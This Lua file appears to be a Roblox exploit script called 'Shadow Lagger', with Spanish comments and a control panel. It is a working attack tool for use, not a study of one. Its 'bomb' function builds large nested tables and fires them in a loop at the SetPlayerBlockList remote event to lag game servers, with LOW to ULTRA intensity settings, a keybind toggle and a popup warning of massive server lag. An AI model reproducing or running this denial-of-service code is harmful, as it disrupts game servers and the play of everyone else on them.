--// SHADOW LAGGER - ULTRA+++ (Advertencia de ULTRA solo la primera vez)
--// LOW | MID | HIGH | ULTRA | ON/OFF | Keybind

local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local CoreGui          = game:GetService("CoreGui")
local HttpService      = game:GetService("HttpService")

local ConfigFile = "ShadowLaggerConfig.json"

-- 🔥 ULTRA+++: poder 75 (3750 items) + delay 0.14s + profundidad 45
local NIVELES = {
	LOW   = { poder = 25,  delay = 0.18, profundidad = 25 },
	MID   = { poder = 32,  delay = 0.18, profundidad = 25 },
	HIGH  = { poder = 85,  delay = 0.18, profundidad = 25 },
	ULTRA = { poder = 75,  delay = 0.14, profundidad = 45 },
}

local keybind           = Enum.KeyCode.F
local listeningForInput = false
local laggerActive      = false
local lagThread         = nil
local nivelActual       = "LOW"
local ventanaBloqueada  = false
local ultraWarningAccepted = false -- Variable para guardar si ya aceptaste la advertencia

local notificacionMostrada = false

-- COLORES
local BG       = Color3.fromRGB(22, 22, 24)
local BTN      = Color3.fromRGB(44, 44, 48)
local BTNACT   = Color3.fromRGB(195, 195, 200)
local TEXT     = Color3.fromRGB(220, 220, 225)
local TEXTDARK = Color3.fromRGB(18,  18,  20)
local DIM      = Color3.fromRGB(110, 110, 120)
local SEP      = Color3.fromRGB(50,  50,  54)
local RED      = Color3.fromRGB(230, 40, 40)
local GREEN    = Color3.fromRGB(80, 200, 120)

-- ── CONFIGURACIÓN (GUARDAR Y CARGAR) ──────────────
local function SaveConfig()
	pcall(function()
		local data = {
			Keybind = keybind.Name,
			Nivel = nivelActual,
			Bloqueado = ventanaBloqueada,
			UltraWarningAccepted = ultraWarningAccepted, -- Se guarda el estado
		}
		writefile(ConfigFile, HttpService:JSONEncode(data))
	end)
end

local function LoadConfig()
	if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
		pcall(function()
			local raw = readfile(ConfigFile)
			local d = HttpService:JSONDecode(raw)
			
			if d.Keybind and Enum.KeyCode[d.Keybind] then
				keybind = Enum.KeyCode[d.Keybind]
			end
			
			nivelActual          = d.Nivel or "LOW"
			ventanaBloqueada     = d.Bloqueado or false
			ultraWarningAccepted = d.UltraWarningAccepted or false
		end)
	end
end

LoadConfig()

-- ── LAG ENGINE ──────────────────────────────────
local function bomb(poder, profundidad)
	profundidad = profundidad or 25
	local main, spam = {}, {{}}
	local z = spam[1]
	for i = 1, profundidad do
		local t = {}
		table.insert(z, t)
		z = t
	end
	local max = math.min(12000, poder * 50)
	for i = 1, max do
		table.insert(main, spam)
	end
	pcall(function()
		game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
	end)
end

-- ── REPRODUCIR SONIDO DESDE URL ──────
local function playSoundFromURL(url, fileName)
	fileName = fileName or "ShadowNotificationSound.mp3"
	task.spawn(function()
		pcall(function()
			if not isfile(fileName) then
				local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
				if httpRequest then
					local response = httpRequest({
						Url = url,
						Method = "GET"
					})
					if response and response.Body then
						writefile(fileName, response.Body)
					end
				end
			end

			if isfile(fileName) and getcustomasset then
				local sound = Instance.new("Sound")
				sound.SoundId = getcustomasset(fileName)
				sound.Volume = 2
				sound.Parent = CoreGui
				sound:Play()

				sound.Ended:Connect(function()
					sound:Destroy()
				end)
			end
		end)
	end)
end

-- ── NOTIFICACIÓN ESTILO IPHONE ──────
local function showIPhoneNotification(texto, duracion)
	if notificacionMostrada then return end
	notificacionMostrada = true

	local notifGui = Instance.new("ScreenGui")
	notifGui.Name = "iPhoneNotification"
	notifGui.Parent = CoreGui
	notifGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	notifGui.ResetOnSpawn = false
	notifGui.IgnoreGuiInset = true

	local frame = Instance.new("Frame", notifGui)
	frame.Size = UDim2.new(0, 300, 0, 70)
	frame.Position = UDim2.new(0.5, -150, 0, 40)
	frame.BackgroundColor3 = Color3.fromRGB(40, 40, 44)
	frame.BackgroundTransparency = 0.1
	frame.BorderSizePixel = 0
	frame.ZIndex = 2
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

	local label = Instance.new("TextLabel", frame)
	label.Size = UDim2.new(1, -30, 1, 0)
	label.Position = UDim2.new(0, 15, 0, 0)
	label.BackgroundTransparency = 1
	label.Font = Enum.Font.GothamSemibold
	label.Text = texto
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.TextSize = 16
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.TextYAlignment = Enum.TextYAlignment.Center
	label.ZIndex = 3
	label.TextWrapped = true

	local icon = Instance.new("ImageLabel", frame)
	icon.Size = UDim2.new(0, 30, 0, 30)
	icon.Position = UDim2.new(1, -45, 0.5, -15)
	icon.BackgroundTransparency = 1
	icon.Image = "rbxassetid://6023426921"
	icon.ZIndex = 3

	playSoundFromURL("https://files.catbox.moe/il5teg.mp3")

	frame.Position = UDim2.new(0.5, -150, -1, 0)
	TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, -150, 0, 40)
	}):Play()

	task.wait(duracion)
	TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, -150, -1, 0)
	}):Play()
	task.wait(0.5)
	notifGui:Destroy()
end

-- ── ADVERTENCIA ULTRA POPUP ──
local function showUltraWarningPopup(onConfirm)
	if CoreGui:FindFirstChild("UltraWarningPopup") then CoreGui.UltraWarningPopup:Destroy() end

	local popupGui = Instance.new("ScreenGui")
	popupGui.Name = "UltraWarningPopup"
	popupGui.Parent = CoreGui
	popupGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	popupGui.ResetOnSpawn = false
	popupGui.IgnoreGuiInset = true

	local overlay = Instance.new("Frame", popupGui)
	overlay.Size = UDim2.new(1, 0, 1, 0)
	overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	overlay.BackgroundTransparency = 0.5
	overlay.BorderSizePixel = 0
	overlay.ZIndex = 10

	local popup = Instance.new("Frame", overlay)
	popup.Size = UDim2.new(0, 340, 0, 170)
	popup.Position = UDim2.new(0.5, -170, 0.5, -85)
	popup.BackgroundColor3 = BG
	popup.BackgroundTransparency = 0
	popup.BorderSizePixel = 0
	popup.ZIndex = 11
	Instance.new("UICorner", popup).CornerRadius = UDim.new(0, 16)

	local title = Instance.new("TextLabel", popup)
	title.BackgroundTransparency = 1
	title.Position = UDim2.new(0, 0, 0, 15)
	title.Size = UDim2.new(1, 0, 0, 30)
	title.Font = Enum.Font.GothamBlack
	title.Text = "⚠️ ADVERTENCIA MODO ULTRA"
	title.TextColor3 = RED
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Center
	title.TextYAlignment = Enum.TextYAlignment.Center
	title.ZIndex = 12

	local msg = Instance.new("TextLabel", popup)
	msg.BackgroundTransparency = 1
	msg.Position = UDim2.new(0, 20, 0, 50)
	msg.Size = UDim2.new(1, -40, 0, 60)
	msg.Font = Enum.Font.GothamSemibold
	msg.Text = "El modo ULTRA consume MUCHO poder.\nProvocará LAG BACK masivo en el servidor.\n¿Deseas activar el modo ULTRA?"
	msg.TextColor3 = TEXT
	msg.TextSize = 13
	msg.TextXAlignment = Enum.TextXAlignment.Center
	msg.TextYAlignment = Enum.TextYAlignment.Top
	msg.ZIndex = 12
	msg.LineHeight = 1.2

	local cancelBtn = Instance.new("TextButton", popup)
	cancelBtn.Size = UDim2.new(0, 120, 0, 36)
	cancelBtn.Position = UDim2.new(0.5, -130, 1, -50)
	cancelBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 30)
	cancelBtn.BorderSizePixel = 0
	cancelBtn.Font = Enum.Font.GothamBold
	cancelBtn.Text = "CANCELAR"
	cancelBtn.TextColor3 = TEXT
	cancelBtn.TextSize = 14
	cancelBtn.AutoButtonColor = false
	cancelBtn.ZIndex = 12
	Instance.new("UICorner", cancelBtn).CornerRadius = UDim.new(0, 8)

	local confirmBtn = Instance.new("TextButton", popup)
	confirmBtn.Size = UDim2.new(0, 120, 0, 36)
	confirmBtn.Position = UDim2.new(0.5, 10, 1, -50)
	confirmBtn.BackgroundColor3 = Color3.fromRGB(30, 60, 30)
	confirmBtn.BorderSizePixel = 0
	confirmBtn.Font = Enum.Font.GothamBold
	confirmBtn.Text = "USAR ULTRA"
	confirmBtn.TextColor3 = GREEN
	confirmBtn.TextSize = 14
	confirmBtn.AutoButtonColor = false
	confirmBtn.ZIndex = 12
	Instance.new("UICorner", confirmBtn).CornerRadius = UDim.new(0, 8)

	local function closePopup()
		popupGui:Destroy()
	end

	cancelBtn.MouseButton1Click:Connect(closePopup)
	confirmBtn.MouseButton1Click:Connect(function()
		closePopup()
		ultraWarningAccepted = true -- Guardamos que ya se aceptó
		SaveConfig()
		if onConfirm then onConfirm() end
	end)
end

-- ── CREAR GUI ────────────────────────────────────
if CoreGui:FindFirstChild("ShadowLagger") then CoreGui.ShadowLagger:Destroy() end

local sg = Instance.new("ScreenGui")
sg.Name = "ShadowLagger"
sg.Parent = CoreGui
sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
sg.ResetOnSpawn = false
sg.IgnoreGuiInset = true

local panel = Instance.new("Frame", sg)
panel.Name = "MainFrame"
panel.Size = UDim2.new(0, 320, 0, 134)
panel.Position = UDim2.new(0.5, -160, 0.35, 0)
panel.BackgroundColor3 = BG
panel.BackgroundTransparency = 1
panel.BorderSizePixel = 0
panel.ClipsDescendants = true
Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 14)

-- Fondo imagen
local bgImage = Instance.new("ImageLabel", panel)
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.Position = UDim2.new(0, 0, 0, 0)
bgImage.BackgroundTransparency = 1
bgImage.BorderSizePixel = 0
bgImage.Image = "rbxassetid://109938574814416"
bgImage.ScaleType = Enum.ScaleType.Crop
bgImage.ZIndex = 0
local corner = Instance.new("UICorner", bgImage)
corner.CornerRadius = UDim.new(0, 14)

-- Sombra
local shadow = Instance.new("Frame", panel)
shadow.Size = UDim2.new(1, 0, 1, 0)
shadow.Position = UDim2.new(0, 0, 0, 0)
shadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
shadow.BackgroundTransparency = 0.4
shadow.BorderSizePixel = 0
shadow.ZIndex = 1
Instance.new("UICorner", shadow).CornerRadius = UDim.new(0, 14)

-- ── SECCIÓN 1: TÍTULO ──
local sec1 = Instance.new("Frame", panel)
sec1.Size = UDim2.new(1, 0, 0, 44)
sec1.Position = UDim2.new(0, 0, 0, 0)
sec1.BackgroundTransparency = 1
sec1.BorderSizePixel = 0
sec1.ZIndex = 2

local titleLbl = Instance.new("TextLabel", sec1)
titleLbl.BackgroundTransparency = 1
titleLbl.Position = UDim2.new(0, 12, 0, 0)
titleLbl.Size = UDim2.new(0.7, 0, 1, 0)
titleLbl.Font = Enum.Font.GothamBlack
titleLbl.Text = "SHADOW LAGGER"
titleLbl.TextColor3 = RED
titleLbl.TextSize = 17
titleLbl.TextXAlignment = Enum.TextXAlignment.Left
titleLbl.TextYAlignment = Enum.TextYAlignment.Center
titleLbl.ZIndex = 3

local lockBtn = Instance.new("TextButton", sec1)
lockBtn.BackgroundTransparency = 1
lockBtn.BorderSizePixel = 0
lockBtn.Position = UDim2.new(1, -60, 0.5, -12)
lockBtn.Size = UDim2.new(0, 56, 0, 24)
lockBtn.Font = Enum.Font.GothamBold
lockBtn.TextSize = 12
lockBtn.TextColor3 = DIM
lockBtn.AutoButtonColor = false
lockBtn.ZIndex = 3

local function actualizarLock()
	lockBtn.Text = ventanaBloqueada and "Lock" or "Unlock"
	lockBtn.TextColor3 = ventanaBloqueada and TEXT or DIM
end
lockBtn.MouseButton1Click:Connect(function()
	ventanaBloqueada = not ventanaBloqueada
	actualizarLock()
	SaveConfig()
end)
actualizarLock()

local sep1 = Instance.new("Frame", panel)
sep1.Size = UDim2.new(1, 0, 0, 1)
sep1.Position = UDim2.new(0, 0, 0, 44)
sep1.BackgroundColor3 = SEP
sep1.BorderSizePixel = 0
sep1.ZIndex = 2

-- ── SECCIÓN 2: ENABLE LAGGER ────
local sec2 = Instance.new("Frame", panel)
sec2.Size = UDim2.new(1, 0, 0, 44)
sec2.Position = UDim2.new(0, 0, 0, 45)
sec2.BackgroundTransparency = 1
sec2.BorderSizePixel = 0
sec2.ZIndex = 2

local enableLbl = Instance.new("TextLabel", sec2)
enableLbl.BackgroundTransparency = 1
enableLbl.Position = UDim2.new(0, 12, 0, 0)
enableLbl.Size = UDim2.new(0, 95, 1, 0)
enableLbl.Font = Enum.Font.GothamBlack
enableLbl.Text = "ENABLE LAGGER"
enableLbl.TextColor3 = TEXT
enableLbl.TextSize = 10
enableLbl.TextXAlignment = Enum.TextXAlignment.Left
enableLbl.TextYAlignment = Enum.TextYAlignment.Center
enableLbl.ZIndex = 3

local keybindBtn = Instance.new("TextButton", sec2)
keybindBtn.BackgroundTransparency = 1
keybindBtn.BorderSizePixel = 0
keybindBtn.Position = UDim2.new(0, 107, 0.5, -10)
keybindBtn.Size = UDim2.new(0, 70, 0, 20)
keybindBtn.Font = Enum.Font.GothamBold
keybindBtn.TextColor3 = DIM
keybindBtn.TextSize = 10
keybindBtn.AutoButtonColor = false
keybindBtn.ZIndex = 3

local function actualizarKeybind()
	keybindBtn.Text = keybind.Name:gsub("Button", "")
end
actualizarKeybind()

local toggleBtn = Instance.new("TextButton", sec2)
toggleBtn.Size = UDim2.new(0, 60, 0, 30)
toggleBtn.Position = UDim2.new(1, -76, 0.5, -15)
toggleBtn.BackgroundColor3 = BTN
toggleBtn.BorderSizePixel = 0
toggleBtn.Font = Enum.Font.GothamBlack
toggleBtn.Text = "OFF"
toggleBtn.TextColor3 = TEXT
toggleBtn.TextSize = 12
toggleBtn.AutoButtonColor = false
toggleBtn.ZIndex = 3
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1, 0)

local function actualizarToggle()
	local on = laggerActive
	TweenService:Create(toggleBtn, TweenInfo.new(0.15), {
		BackgroundColor3 = on and BTNACT or BTN,
		TextColor3       = on and TEXTDARK or TEXT,
	}):Play()
	toggleBtn.Text = on and "ON" or "OFF"
end

local function toggleLagger()
	laggerActive = not laggerActive
	actualizarToggle()
	if laggerActive then
		if lagThread then task.cancel(lagThread) end
		lagThread = task.spawn(function()
			while laggerActive do
				local nivel = NIVELES[nivelActual]
				pcall(function()
					bomb(nivel.poder, nivel.profundidad)
				end)
				task.wait(nivel.delay)
			end
		end)
	else
		if lagThread then task.cancel(lagThread); lagThread = nil end
	end
end

local function requestToggle()
	if laggerActive then
		toggleLagger()
		return
	end

	-- Muestra advertencia solo si está en ULTRA y aún no se ha aceptado antes
	if nivelActual == "ULTRA" and not ultraWarningAccepted then
		showUltraWarningPopup(function()
			toggleLagger()
		end)
	else
		toggleLagger()
	end
end

toggleBtn.MouseButton1Click:Connect(requestToggle)
actualizarToggle()

local sep2 = Instance.new("Frame", panel)
sep2.Size = UDim2.new(1, 0, 0, 1)
sep2.Position = UDim2.new(0, 0, 0, 89)
sep2.BackgroundColor3 = SEP
sep2.BorderSizePixel = 0
sep2.ZIndex = 2

-- ── SECCIÓN 3: NIVELES ──
local sec3 = Instance.new("Frame", panel)
sec3.Size = UDim2.new(1, 0, 0, 44)
sec3.Position = UDim2.new(0, 0, 0, 90)
sec3.BackgroundTransparency = 1
sec3.BorderSizePixel = 0
sec3.ZIndex = 2

local layout = Instance.new("UIListLayout", sec3)
layout.FillDirection = Enum.FillDirection.Horizontal
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Center
layout.Padding = UDim.new(0, 4)

local function makeBtn(label)
	local b = Instance.new("TextButton", sec3)
	b.Size = UDim2.new(0, 75, 0, 30)
	b.Font = Enum.Font.GothamBlack
	b.Text = label
	b.TextSize = 12
	b.AutoButtonColor = false
	b.BorderSizePixel = 0
	b.ZIndex = 3
	b.BackgroundColor3 = BTN
	b.TextColor3 = TEXT
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
	return b
end

local btnLow   = makeBtn("LOW")
local btnMid   = makeBtn("MID")
local btnHigh  = makeBtn("HIGH")
local btnUltra = makeBtn("ULTRA")

local function actualizarBotones()
	for k, b in pairs({LOW = btnLow, MID = btnMid, HIGH = btnHigh, ULTRA = btnUltra}) do
		local on = nivelActual == k
		TweenService:Create(b, TweenInfo.new(0.15), {
			BackgroundColor3 = on and BTNACT or BTN,
			TextColor3       = on and TEXTDARK or TEXT,
		}):Play()
	end
end

btnLow.MouseButton1Click:Connect(function()  nivelActual = "LOW";   actualizarBotones(); SaveConfig() end)
btnMid.MouseButton1Click:Connect(function()  nivelActual = "MID";   actualizarBotones(); SaveConfig() end)
btnHigh.MouseButton1Click:Connect(function() nivelActual = "HIGH"; actualizarBotones(); SaveConfig() end)

-- Cambio a ULTRA solo pide confirmación si no ha sido aceptada antes
btnUltra.MouseButton1Click:Connect(function()
	if nivelActual == "ULTRA" then return end
	if not ultraWarningAccepted then
		showUltraWarningPopup(function()
			nivelActual = "ULTRA"
			actualizarBotones()
			SaveConfig()
		end)
	else
		nivelActual = "ULTRA"
		actualizarBotones()
		SaveConfig()
	end
end)

actualizarBotones()

-- ── KEYBIND ─────────────────────────────────
keybindBtn.MouseButton1Click:Connect(function()
	if listeningForInput then return end
	listeningForInput = true
	keybindBtn.Text = "..."
	keybindBtn.TextColor3 = TEXT
end)

UserInputService.InputBegan:Connect(function(input, gp)
	if listeningForInput then
		if gp then return end
		local k = input.KeyCode ~= Enum.KeyCode.Unknown and input.KeyCode or nil
		if k then
			keybind = k
			actualizarKeybind()
			SaveConfig()
			listeningForInput = false
			keybindBtn.TextColor3 = DIM
		end
		return
	end
	if not gp and input.KeyCode == keybind then
		requestToggle()
	end
end)

-- ── DRAG ────────────────────────────────────
local isDragging, dragStart, startPos = false, nil, nil

local dragBtn = Instance.new("TextButton", sec1)
dragBtn.BackgroundTransparency = 1
dragBtn.BorderSizePixel = 0
dragBtn.Size = UDim2.new(1, -80, 1, 0)
dragBtn.Position = UDim2.new(0, 0, 0, 0)
dragBtn.ZIndex = 10
dragBtn.Text = ""
dragBtn.AutoButtonColor = false

dragBtn.InputBegan:Connect(function(input)
	if ventanaBloqueada then return end
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		isDragging = true
		dragStart = input.Position
		startPos = panel.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then isDragging = false end
		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if not isDragging or ventanaBloqueada then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		local d = input.Position - dragStart
		panel.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		isDragging = false
	end
end)

-- ── INICIALIZACIÓN ──────────────────────────
task.spawn(function()
	task.wait(0.5)
	showIPhoneNotification("Script Lagger de Shadow Lagger\nse cargó exitosamente", 4)
end)